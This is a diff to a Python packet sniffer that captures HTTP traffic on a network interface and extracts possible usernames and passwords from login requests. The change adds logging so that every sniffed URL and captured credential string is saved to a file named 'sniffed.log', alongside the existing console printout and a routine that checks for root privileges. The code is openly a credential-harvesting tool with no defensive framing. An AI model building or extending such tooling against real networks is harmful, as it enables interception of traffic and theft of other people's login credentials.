@@ -3,6 +3,10 @@ import os
 import sys
 from scapy_http import http
 import netifaces
+import logging
+
+logging.basicConfig(filename='sniffed.log', level=logging.DEBUG,
+                    format='%(asctime)s:%(levelname)s:%(message)s')
 
 def become_root():
     euid = os.geteuid()
@@ -35,9 +39,11 @@ def get_login(packet):
 def processed_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         url = str(geturl(packet))
+        logging.debug("HTTP Requests -> {}".format(url))
         print("[+] HTTP Requests -->" + url)
         login_info = str(get_login(packet))
         if login_info:
+            logging.debug("Possible Username/Password -> {}".format(login_info))
             print("\n\n[+] Possible Username/Password -->" + login_info + "\n\n")
 
 
@@ -52,4 +58,5 @@ def run_sniff():
     else:
         print("Sniffing.........")
         sniff(interface)
+
 
